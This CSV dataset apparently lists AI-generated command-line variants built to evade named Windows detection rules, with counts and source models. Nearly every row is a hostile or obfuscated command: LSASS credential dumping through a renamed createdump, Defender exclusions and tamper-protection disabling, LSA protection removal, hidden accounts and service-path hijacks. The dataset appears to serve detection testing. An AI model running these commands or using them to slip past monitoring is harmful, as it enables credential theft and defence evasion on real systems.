rule_name,commandline_evasion,row_count,sources
proc_creation_win_powershell_getprocess_lsass,"powershell.exe -Command ""& {ps -ProcessName lsass}""",2,gemini; qwen32b
proc_creation_win_powershell_getprocess_lsass,"powershell.exe -Command ""Get-Process -Name lsass | Out-Null""",2,qwen14b; qwen32b
proc_creation_win_powershell_getprocess_lsass,"powershell.exe -Command ""Get-Process -Name lsass""",1,qwen32b
proc_creation_win_powershell_getprocess_lsass,"powershell.exe -Command ""Get-Process | Where-Object { $_.ProcessName -eq 'lsass' } | Out-Null""",1,qwen14b
proc_creation_win_powershell_getprocess_lsass,"powershell.exe -Command ""gps -Name lsass""",1,qwen32b
proc_creation_win_powershell_getprocess_lsass,"powershell.exe -Command ""ps -Name lsass""",1,qwen32b
proc_creation_win_powershell_import_cert_susp_locations,"powershell -Command ""& {Import-Certificate -FilePath 'C:\\Users\\Public\\certificate.cer' -CertStoreLocation 'Cert:\\LocalMachine\\Root'}""",1,gemini
proc_creation_win_powershell_import_cert_susp_locations,"powershell -Command ""Import-Certificate -FilePath 'C:\\Users\\Public\\certificate.cer' -CertStoreLocation 'Cert:\\LocalMachine\\Root'""",1,gemini
proc_creation_win_powershell_import_cert_susp_locations,powershell Import-Certificate -CertStoreLocation 'Cert:\\LocalMachine\\Root' -FilePath 'C:\\Users\\Public\\certificate.cer',1,gemini
proc_creation_win_powershell_import_cert_susp_locations,"powershell.exe -Command ""Import-Certificate -CertStoreLocation 'Cert:\LocalMachine\Root' -FilePath 'C:\Lab\input\sample.crt'""",1,qwen14b
proc_creation_win_powershell_import_cert_susp_locations,"powershell.exe -Command ""Import-Certificate -FilePath 'C:\Lab\input\sample.crt' -CertStoreLocation 'Cert:\LocalMachine\Root'""",1,qwen14b
proc_creation_win_powershell_import_cert_susp_locations,"powershell.exe -Command ""Import-Certificate -FilePath 'C:\Lab\input\sample.crt' -Store 'Root' -Location 'LocalMachine'""",1,qwen14b
proc_creation_win_powershell_reverse_shell_connection,"powershell.exe -Command ""[System.Net.Sockets.TCPClient]::new('192.168.1.100',443).GetStream().Write([Text.Encoding]::ASCII.GetBytes('test'),0,4) | Out-Null""",1,qwen32b
proc_creation_win_powershell_reverse_shell_connection,"powershell.exe -Command ""[System.Net.Sockets.TCPClient]::new('192.168.1.100',443).GetStream().Write([Text.Encoding]::ASCII.GetBytes('test'),0,4)""",1,qwen32b
proc_creation_win_powershell_reverse_shell_connection,"powershell.exe -Command ""[System.Net.Sockets.TcpClient]::new('127.0.0.1', 1234).GetStream().Write([System.Text.Encoding]::ASCII.GetBytes('Test')), [System.Text.Encoding]::ASCII.GetBytes('Test'))""",3,qwen14b:2; qwen32b
proc_creation_win_powershell_reverse_shell_connection,"powershell.exe -NoExit -Command ""& {$tcpClient = New-Object System.Net.Sockets.TCPClient; $tcpClient.Connect('127.0.0.1', 8080); $stream = $tcpClient.GetStream(); $stream.Write([System.Text.Encoding]::ASCII.GetBytes('Hello'), 0, 5)}""",1,gemini
proc_creation_win_powershell_run_script_from_ads,"powershell.exe ""& {Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamCommand' | Invoke-Expression}""",1,qwen32b
proc_creation_win_powershell_run_script_from_ads,"powershell.exe -Command ""Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamCommand' | Invoke-Expression""",1,qwen32b
proc_creation_win_powershell_run_script_from_ads,"powershell.exe -Command ""[System.IO.File]::OpenText('file.txt:secret.ps1').ReadToEnd() | IEX""",1,gemini
proc_creation_win_powershell_set_policies_to_unsecure_level,"powershell.exe -ExecutionPolicy RemoteSigned -c ""Get-ChildItem C:\Lab\input\sample.txt""",1,qwen14b
proc_creation_win_powershell_set_policies_to_unsecure_level,"powershell.exe -nop -ExecutionPolicy RemoteSigned -c ""Get-ChildItem C:\Lab\input\sample.txt""",1,qwen14b
proc_creation_win_powershell_set_service_disabled,"powershell -Command ""Set-Service -Name 'Spooler' -StartupType 'Disabled'""",2,gemini:2
proc_creation_win_powershell_set_service_disabled,"powershell -Command ""Set-Service -Name Spooler -StartupType Disabled""",2,gemini:2
proc_creation_win_powershell_set_service_disabled,"powershell -Command ""Set-Service -StartupType 'Disabled' -Name Spooler""",2,gemini:2
proc_creation_win_powershell_set_service_disabled,"powershell -Command ""Set-Service Spooler -StartupType Disabled""",2,gemini:2
proc_creation_win_powershell_susp_parent_process,C:\WINDOWS\system32\cmd.exe /c  powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt,1,gemini
proc_creation_win_powershell_susp_parent_process,"C:\WINDOWS\system32\cmd.exe /c ""powershell.exe"" -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt",2,gemini; qwen32b
proc_creation_win_powershell_susp_parent_process,C:\WINDOWS\system32\cmd.exe /c powershell -nop -w hidden -command New-Item -ItemType File C:\Lab\input\sample.txt,2,qwen14b; qwen32b
proc_creation_win_powershell_susp_parent_process,"C:\WINDOWS\system32\cmd.exe /c powershell.exe -nop -w hidden -command ""New-Item -ItemType File C:\Lab\input\sample.txt""",1,qwen14b
proc_creation_win_powershell_susp_parent_process,C:\WINDOWS\system32\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\Lab\input\sample.txt,1,qwen14b
proc_creation_win_powershell_susp_parent_process,C:\WINDOWS\system32\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt,1,qwen32b
proc_creation_win_powershell_susp_parent_process,C:\WINDOWS\system32\cmd.exe /k powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt,1,gemini
proc_creation_win_powershell_susp_parent_process,"C:\\WINDOWS\\system32\\cmd.exe /c ""powershell.exe"" -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt",1,gemini
proc_creation_win_powershell_susp_parent_process,C:\\WINDOWS\\system32\\cmd.exe /c powershell -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt,2,gemini; qwen32b
proc_creation_win_powershell_susp_parent_process,"C:\\WINDOWS\\system32\\cmd.exe /c powershell.exe -nop -w hidden -command ""New-Item -ItemType File C:\\art-marker.txt""",2,gemini; qwen32b
proc_creation_win_powershell_susp_parent_process,C:\\WINDOWS\\system32\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt,1,gemini
proc_creation_win_powershell_susp_parent_process,C:\\WINDOWS\system32\cmd.exe /c powershell.exe -nop -w hidden -command (New-Item -ItemType File C:\\art-marker.txt),1,qwen32b
proc_creation_win_powershell_susp_parent_process,C:\\WINDOWS\system32\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt,2,qwen32b:2
proc_creation_win_powershell_user_discovery_get_aduser,"powershell.exe -Command ""Get-ADUser -Filter *",1,qwen32b
proc_creation_win_pua_ngrok,powershell.exe & {C:\Users\Public\ngrok\ngrok.exe config add-authtoken N\A | Out-Null Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe http 80 } | Out-Null Start-Sleep -s 5 Stop-Job -Name Job1 | Out-Null},1,qwen14b
proc_creation_win_pua_rcedit_execution,"copy rcedit-x64.exe r.exe && .\r.exe target.exe --set-version-string ""Original""""FileName"" ""svchost.exe""",4,gemini:4
proc_creation_win_pua_rcedit_execution,"ren rcedit-x64.exe not_rcedit.exe && .\not_rcedit.exe target.exe --set-version-string ""OriginalFileName"" ""lsass.exe""",4,gemini:4
proc_creation_win_python_adidnsdump,copy C:\Python39\python.exe C:\Temp\runner.exe && C:\Temp\runner.exe -m adidnsdump -u DOMAIN\User -p Password ldap://10.10.10.10,1,gemini
proc_creation_win_python_adidnsdump,python.exe my_dns_enum.py -u DOMAIN\User -p Password ldap://10.10.10.10,1,gemini
proc_creation_win_reg_defender_exclusion,"reg.exe ADD ""HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths"" /v ""C:\\Evil"" /t REG_DWORD /d 0 /f",1,gemini
proc_creation_win_reg_defender_exclusion,"reg.exe ADD ""HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"" /v ""C:\\Evil"" /t REG_DWORD /d 00 /f",1,gemini
proc_creation_win_reg_defender_exclusion,"reg.exe ADD ""HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"" /v C:\\Evil /t REG_DWORD /d 0 /f",1,gemini
proc_creation_win_reg_defender_exclusion,"reg.exe ADD ""HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"" ^/v ""C:\\Evil"" ^/t REG_DWORD ^/d 0 ^/f",2,gemini; qwen32b
proc_creation_win_reg_defender_exclusion,reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\Defender\Exclusions\Paths /t REG_DWORD /v TestExclusion /d 0,1,qwen32b
proc_creation_win_reg_disable_defender_wmi_autologger,"reg add ""HKLM\Control\WMI\Autologger\DefenderApiLogger"" /v Start /t REG_DWORD /d 0 /f",1,qwen14b
proc_creation_win_reg_disable_defender_wmi_autologger,"reg add /v ""Control\WMI\Autologger\DefenderAuditLogger\Start"" /t REG_DWORD /d 0",1,gemini
proc_creation_win_reg_disable_defender_wmi_autologger,reg add HKLM\Control\WMI\Autologger\DefenderApiLogger /v Start /t REG_DWORD /d 0 /f,1,qwen14b
proc_creation_win_reg_disable_defender_wmi_autologger,reg add HKLM\Control\WMI\Autologger\DefenderApiLogger /v Start /t REG_DWORD /d 0 /f /quiet,1,qwen14b
proc_creation_win_reg_disable_defender_wmi_autologger,"reg.exe add ""Control\WMI\Autologger\DefenderApiLogger\Start"" 0x0",1,gemini
proc_creation_win_reg_disable_defender_wmi_autologger,"reg.exe add ""\\\Control\\WMI\\Autologger\\DefenderApiLogger\\Start"" /v 0 /t REG_DWORD /d 0 /f",1,gemini
proc_creation_win_reg_disable_defender_wmi_autologger,"reg.exe add ""\\\Control\\WMI\\Autologger\\DefenderApiLogger\\Start"" 0",1,gemini
proc_creation_win_reg_disable_defender_wmi_autologger,"reg.exe add /d 0 /t REG_DWORD /v ""Control\WMI\Autologger\DefenderAuditLogger\Start""",1,gemini
proc_creation_win_reg_import_from_suspicious_paths,"reg.exe import ""C:\Lab\input\test.reg""",1,qwen14b
proc_creation_win_reg_import_from_suspicious_paths,reg.exe import C:\Lab\input\test.reg,1,qwen14b
proc_creation_win_reg_lsa_ppl_protection_disabled,"reg   add   ""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa""   /v   RunAsPPL   /d   0   /f",2,gemini; qwen32b
proc_creation_win_reg_lsa_ppl_protection_disabled,"reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Lsa"" /d 0 /v RunAsPPL",1,qwen32b
proc_creation_win_reg_lsa_ppl_protection_disabled,reg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /d 0 /f,1,qwen32b
proc_creation_win_reg_query_registry,"powershell.exe -""Command"" ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'""",1,gemini
proc_creation_win_reg_query_registry,"powershell.exe -COMMaND ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'""",3,gemini:2; qwen32b
proc_creation_win_reg_query_registry,"powershell.exe -COMmand ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'""",2,gemini:2
proc_creation_win_reg_query_registry,"powershell.exe -COmmAnD ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'""",3,gemini:2; qwen32b
proc_creation_win_reg_query_registry,"powershell.exe -CoMmAnD ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'""",2,gemini:2
proc_creation_win_reg_query_registry,"powershell.exe -Command ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'""",3,gemini:2; qwen32b
proc_creation_win_reg_query_registry,"powershell.exe -Command ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'""",3,gemini:2; qwen32b
proc_creation_win_reg_query_registry,"powershell.exe -c ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'""",3,gemini:2; qwen32b
proc_creation_win_reg_query_registry,"powershell.exe -c ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'""",3,gemini:2; qwen32b
proc_creation_win_reg_query_registry,"powershell.exe -cOMmaNd ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'""",2,gemini:2
proc_creation_win_reg_query_registry,"powershell.exe -cOmMaNd ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'""",3,gemini:2; qwen32b
proc_creation_win_reg_query_registry,"powershell.exe -cOmmaNd ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'""",2,gemini:2
proc_creation_win_reg_query_registry,"powershell.exe -comMANd ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'""",3,gemini:2; qwen32b
proc_creation_win_reg_query_registry,"powershell.exe /""Command"" ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'""",2,gemini; qwen32b
proc_creation_win_reg_query_registry,"powershell.exe /""Command"" ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'""",2,gemini; qwen32b
proc_creation_win_reg_query_registry,reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows,1,qwen32b
proc_creation_win_reg_screensaver,reg add HKCU\Control Panel\Desktop /v SCRNSAVE.EXE /t REG_SZ /d calc.exe /f,1,gemini
proc_creation_win_reg_screensaver,"reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop""  /v  ScreenSaveActive  /t  REG_SZ  /d  1  /f",1,gemini
proc_creation_win_reg_screensaver,"reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" ""/v"" ScreenSaveActive ""/t"" REG_SZ ""/d"" 1 ""/f""",1,gemini
proc_creation_win_reg_screensaver,"reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" -v ScreenSaveActive -t REG_SZ -d 1 -f",1,gemini
proc_creation_win_reg_windows_defender_tamper,reg add HKLM\SOFTWARE\Microsoft\Windows\Defender\Features /v TamperProtection /t REG_DWORD /d 0 /f,1,qwen32b
proc_creation_win_reg_write_protect_for_storage_disabled,"cmd /c reg add ""HKLM\System\CurrentControlSet\Control\StorageDevicePolicies"" /v WriteProtect /t REG_DWORD /d 0 /f",1,gemini
proc_creation_win_reg_write_protect_for_storage_disabled,cmd.exe /c reg add HKLM\System\CurrentControlSet\Control\StorageDevicePolicies /v WriteProtect /d 0 /t REG_DWORD /f,2,gemini; qwen32b
proc_creation_win_reg_write_protect_for_storage_disabled,cmd.exe /c reg add HKLM\System\CurrentControlSet\Control\StorageDevicePolicies /v WriteProtect /t REG_DWORD /d 0 /f,1,gemini
proc_creation_win_reg_write_protect_for_storage_disabled,"reg add ""HKLM\System\CurrentControlSet\Control"" /v ""Write Protection"" /t REG_DWORD /d 0 /f",1,qwen32b
proc_creation_win_reg_write_protect_for_storage_disabled,"reg add ""HKLM\System\CurrentControlSet\Control\Storage"" /v WriteProtection /t REG_DWORD /d 0 /f",2,qwen14b; qwen32b
proc_creation_win_reg_write_protect_for_storage_disabled,"reg add HKLM\System\CurrentControlSet\Control /v ""Write Protection"" /d 0 /t REG_DWORD /f",1,qwen32b
proc_creation_win_reg_write_protect_for_storage_disabled,"reg add HKLM\System\CurrentControlSet\Control /v ""Write Protection"" /t REG_DWORD /d 0",1,qwen32b
proc_creation_win_reg_write_protect_for_storage_disabled,reg add HKLM\System\CurrentControlSet\Control /v Write\ Protection /t REG_DWORD /d 0 /f,1,qwen32b
proc_creation_win_reg_write_protect_for_storage_disabled,reg add HKLM\System\CurrentControlSet\Control\Storage /v WriteProtection /t REG_DWORD /d 0 /f,1,qwen14b
proc_creation_win_regasm_regsvcs_uncommon_extension_execution,C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U C:\Lab\input\sample.log,1,qwen14b
proc_creation_win_regasm_regsvcs_uncommon_extension_execution,C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe C:\Lab\input\archive.7z,1,qwen14b
proc_creation_win_registry_cimprovider_dll_load,"C:\Windows\SysWow64\Register-CimProvider.exe -Path ""C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.tmp""",1,gemini
proc_creation_win_registry_cimprovider_dll_load,"C:\Windows\SysWow64\Register-CimProvider.exe -p""a""th ""C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll""",1,gemini
proc_creation_win_registry_cimprovider_dll_load,"C:\Windows\SysWow64\Register-CimProvider.exe /Path ""C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll""",2,gemini:2
proc_creation_win_registry_office_disable_python_security_warnings,"reg add ""HKCU\Software\Microsoft\Office\Excel\Security"" /v PythonFunctionWarnings /t REG_DWORD /d 1 /f",2,qwen14b; qwen32b
proc_creation_win_registry_office_disable_python_security_warnings,reg add HKCU\\Microsoft\\Office\\16.0\\Excel\\Security /v PythonFunctionWarnings /d 0 /t REG_DWORD /f,1,qwen32b
proc_creation_win_registry_set_unsecure_powershell_policy,"powershell.exe -Command ""Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force""",1,qwen14b
proc_creation_win_registry_set_unsecure_powershell_policy,"powershell.exe -Command ""Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Verbose""",1,qwen14b
proc_creation_win_registry_set_unsecure_powershell_policy,"powershell.exe -Command ""Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned""",1,qwen14b
proc_creation_win_registry_set_unsecure_powershell_policy,"powershell.exe -Command ""Set-ItemProperty -Path 'HKCU:\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' -Name ExecutionPolicy -Value 'RemoteSigned'""",1,qwen32b
proc_creation_win_registry_special_accounts_hide_user,reg add HKLM\SOFTWARE\Microsoft\Windows\NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v HiddenUser /d 0,2,gemini; qwen32b
proc_creation_win_registry_special_accounts_hide_user,reg.exe add HKLM\SOFTWARE\Microsoft\Windows\NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v HiddenUser /d 0 /f,1,gemini
proc_creation_win_renamed_createdump,"copy C:\Windows\Microsoft.NET\Framework64\v4.0.30319\createdump.exe C:\Temp\not_a_dump.exe && C:\Temp\not_a_dump.exe -""-full"" -""-name"" /tmp/lsass_dump.bin 632",5,gemini:4; qwen32b
proc_creation_win_renamed_createdump,"copy C:\Windows\Microsoft.NET\Framework64\v4.0.30319\createdump.exe C:\Temp\not_a_dump.exe && C:\Temp\not_a_dump.exe -""-full"" --nAME /TMP/lsAss_dUmp.BIN 632",5,gemini:4; qwen32b
proc_creation_win_renamed_createdump,"copy C:\Windows\Microsoft.NET\Framework64\v4.0.30319\createdump.exe C:\Temp\not_a_dump.exe && C:\Temp\not_a_dump.exe -""-full"" --name /""tmp/lsass_dump.bin"" 632",5,gemini:4; qwen32b
proc_creation_win_renamed_createdump,copy C:\Windows\Microsoft.NET\Framework64\v4.0.30319\createdump.exe C:\Temp\not_a_dump.exe && C:\Temp\not_a_dump.exe --FUlL --name /tmp/lsass_dump.bin 632,4,gemini:4
proc_creation_win_renamed_createdump,"copy C:\Windows\Microsoft.NET\Framework64\v4.0.30319\createdump.exe C:\Temp\not_a_dump.exe && C:\Temp\not_a_dump.exe --FuLL /""-name"" /tMP/lSaSS_DuMp.bin 632",4,gemini:4
proc_creation_win_renamed_createdump,"copy C:\Windows\Microsoft.NET\Framework64\v4.0.30319\createdump.exe C:\Temp\not_a_dump.exe && C:\Temp\not_a_dump.exe --fULL /""-name"" -""tmp/lsass_dump.bin"" 632",5,gemini:4; qwen32b
proc_creation_win_renamed_createdump,"copy C:\Windows\Microsoft.NET\Framework64\v4.0.30319\createdump.exe C:\Temp\not_a_dump.exe && C:\Temp\not_a_dump.exe --fulL --name /""tmp/lsass_dump.bin"" 632",5,gemini:4; qwen32b
proc_creation_win_renamed_createdump,copy C:\Windows\Microsoft.NET\Framework64\v4.0.30319\createdump.exe C:\Temp\not_a_dump.exe && C:\Temp\not_a_dump.exe --full --NaMe /tmp/lsass_dump.bin 632,5,gemini:4; qwen32b
proc_creation_win_renamed_createdump,copy C:\Windows\Microsoft.NET\Framework64\v4.0.30319\createdump.exe C:\Temp\not_a_dump.exe && C:\Temp\not_a_dump.exe --full --name /tMp/LSaSs_DUMp.bIn 632,5,gemini:4; qwen32b
proc_creation_win_renamed_createdump,copy C:\Windows\Microsoft.NET\Framework64\v4.0.30319\createdump.exe C:\Temp\not_a_dump.exe && C:\Temp\not_a_dump.exe --full --name /tmp/lsass_dump.bin 632,5,gemini:4; qwen32b
proc_creation_win_renamed_createdump,"copy C:\Windows\Microsoft.NET\Framework64\v4.0.30319\createdump.exe C:\Temp\not_a_dump.exe && C:\Temp\not_a_dump.exe /""-full"" -""-name"" /TmP/lSass_dUMp.BIN 632",5,gemini:4; qwen32b
proc_creation_win_rundll32_ads_stored_dll_execution,rundll32 C:\Lab\input\sample.txt:ADSDLL.dll DllMain,1,qwen14b
proc_creation_win_rundll32_ads_stored_dll_execution,"rundll32 C:\Lab\input\sample.txt:ADSDLL.dll,DllMain",1,qwen14b
proc_creation_win_rundll32_ads_stored_dll_execution,"rundll32.exe C:\ads\file.txt:ADSDLL.dll,DllMain",2,qwen32b:2
proc_creation_win_rundll32_advpack_obfuscated_ordinal_call,"rundll32.exe advpack.dll,InstallOCX C:\Windows\System32\shell32.dll,#12",1,qwen32b
proc_creation_win_rundll32_advpack_obfuscated_ordinal_call,"rundll32.exe advpack.dll,InstallOCX C:\Windows\System32\shell32.dll,#12 #12",1,qwen32b
proc_creation_win_rundll32_advpack_obfuscated_ordinal_call,"rundll32.exe advpack.dll,InstallOCX C:\Windows\System32\shell32.dll,#12--",1,qwen32b
proc_creation_win_rundll32_advpack_obfuscated_ordinal_call,"rundll32.exe advpack.dll,InstallOCX C:\Windows\System32\shell32.dll,#12-12",1,qwen32b
proc_creation_win_rundll32_inline_vbs,rundll32.exe -Execute C:\Lab\input\script.dll,1,qwen14b
proc_creation_win_rundll32_inline_vbs,rundll32.exe C:\Lab\input\script.dll Execute,1,qwen14b
proc_creation_win_rundll32_inline_vbs,"rundll32.exe C:\Lab\input\script.dll,Execute",1,qwen14b
proc_creation_win_rundll32_udl_exec,"cmd.exe /c rundll32.exe oledb32.dll,OpenDSLFile C:\Users\user\Downloads\test.udl",7,gemini:6; qwen32b
proc_creation_win_rundll32_udl_exec,"rundll32.exe oledb32.dll,OpenDSLFile ""C:\Users\TestUser\Downloads\malicious.udl""",3,qwen32b:3
proc_creation_win_rundll32_udl_exec,"rundll32.exe oledb32.dll,OpenDSLFile ""C:\Users\TestUser\Downloads\malicious.udl"" >nul 2>&1",3,qwen32b:3
proc_creation_win_rundll32_udl_exec,"rundll32.exe oledb32.dll,OpenDSLFile ""C:\Users\TestUser\Downloads\malicious.udl"" | findstr /v ""error""",3,qwen32b:3
proc_creation_win_rundll32_udl_exec,"rundll32.exe oledb32.dll,OpenDSLFile ""C:\Users\admin\Downloads\test.udl""",7,gemini:6; qwen32b
proc_creation_win_rundll32_udl_exec,"rundll32.exe oledb32.dll,OpenDSLFile C:\ProgramData\test.udl",7,gemini:6; qwen32b
proc_creation_win_rundll32_udl_exec,"rundll32.exe oledb32.dll,OpenDSLFile C:\Users\TestUser\Downloads\malicious.udl",3,qwen32b:3
proc_creation_win_rundll32_udl_exec,"set UDL_PATH=C:\Users\TestUser\Downloads\malicious.udl && rundll32.exe oledb32.dll,OpenDSLFile ""%UDL_PATH%""",3,qwen32b:3
proc_creation_win_rundll32_webdav_client_execution,"rundll32.exe ""C:\windows\system32\davclnt.dll,DavSetCookie"" example.com http://example.com/sales",2,qwen14b; qwen32b
proc_creation_win_rundll32_webdav_client_execution,"rundll32.exe %windir%\system32\davclnt.dll,DavSetCookie",1,gemini
proc_creation_win_rundll32_webdav_client_execution,"rundll32.exe -dll ""C:\windows\system32\davclnt.dll,DavSetCookie"" example.com http://example.com/sales",1,qwen14b
proc_creation_win_rundll32_webdav_client_execution,"rundll32.exe C:\WINDOWS\system32\davclnt.dll,DavSetCookie example.com http://example.com/sales",4,qwen32b:4
proc_creation_win_rundll32_webdav_client_execution,"rundll32.exe C:\\WINDOWS\\system32\\davclnt.dll,DavSetCookie example.com http://example.com/sales",1,qwen32b
proc_creation_win_rundll32_webdav_client_execution,"rundll32.exe C:\\windows\system32\davclnt.dll,DavSetCookie",1,gemini
proc_creation_win_rundll32_webdav_client_execution,"rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie",1,gemini
proc_creation_win_rundll32_webdav_client_execution,"rundll32.exe davclnt.dll,DavSetCookie",1,gemini
proc_creation_win_rundll32_webdav_client_execution,"rundll32.exe example.com http://example.com/sales ""C:\windows\system32\davclnt.dll,DavSetCookie""",1,qwen14b
proc_creation_win_sc_change_sevice_image_path_by_non_admin,"cmd.exe /c sc.exe c^onfig b^inPath= ""C:\Windows\Temp\benign.exe""",4,gemini:3; qwen32b
proc_creation_win_sc_change_sevice_image_path_by_non_admin,"sc.exe  config   ""WeakService""   BINPATH=   ""mal.exe""",4,gemini:3; qwen32b
proc_creation_win_sc_change_sevice_image_path_by_non_admin,"sc.exe ""config"" ""binpath""= ""C:\Windows\Temp\benign.exe""",4,gemini:3; qwen32b
proc_creation_win_sc_change_sevice_image_path_by_non_admin,"sc.exe \""config\"" MyService binPath= \""C:\\Malicious\\Path.exe\""",3,qwen32b:3
proc_creation_win_sc_change_sevice_image_path_by_non_admin,"sc.exe config MyService binPath= ""C:\Malicious\Path.exe""",3,qwen32b:3
proc_creation_win_sc_change_sevice_image_path_by_non_admin,"sc.exe config MyService binPath= ""C:\\Malicious\\Path.exe""",3,qwen32b:3
proc_creation_win_sc_change_sevice_image_path_by_non_admin,"sc.exe config WeakService ""BINPATH=mal.exe""",3,gemini:3
proc_creation_win_sc_change_sevice_image_path_by_non_admin,sc.exe config WeakService BINPATH=mal.exe,4,gemini:3; qwen32b
proc_creation_win_sc_change_sevice_image_path_by_non_admin,"sc.exe config WeakService binPath= ""mal.exe""",4,gemini:3; qwen32b
proc_creation_win_sc_change_sevice_image_path_by_non_admin,"sc.exe config service_name binPath= ""C:\Windows\Temp\benign.exe""",3,gemini:3
proc_creation_win_sc_change_sevice_image_path_by_non_admin,"sc.exe failure MyService command= ""C:\Malicious\Path.exe"" reset= 86400 actions= restart/60000,restart/60000,restart/60000",6,qwen32b:6
proc_creation_win_sc_query_interesting_services,"cmd.exe /""c"" sc.exe q^uery te^rmservice",1,gemini
proc_creation_win_sc_query_interesting_services,"powershell.exe Get-Service /""Name"" termservice",1,gemini
proc_creation_win_sc_query_interesting_services,sc.exe qc termservice,1,gemini
proc_creation_win_sc_sdset_modification,"powershell.exe -Command ""[WmiClass]'Win32_Service' | Where-Object {$_.Name -eq 'BenignService'} | Invoke-Method -Name SetSecurityDescriptor -ArgumentList ...""",4,gemini:3; qwen32b
